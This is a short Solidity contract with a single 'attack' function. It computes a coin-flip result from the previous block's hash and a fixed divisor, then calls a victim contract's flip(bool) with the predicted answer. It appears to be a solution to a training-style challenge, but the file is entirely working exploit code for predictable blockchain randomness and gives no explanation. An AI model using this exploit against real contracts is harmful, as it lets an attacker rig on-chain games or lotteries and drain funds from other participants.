// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract Testing {
    function attack(address victimAddress) public {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        bytes memory payload = abi.encodeWithSignature("flip(bool)", side);
        (bool success, bytes memory returnData) = victimAddress.call(payload);
        require(success);
    }
}
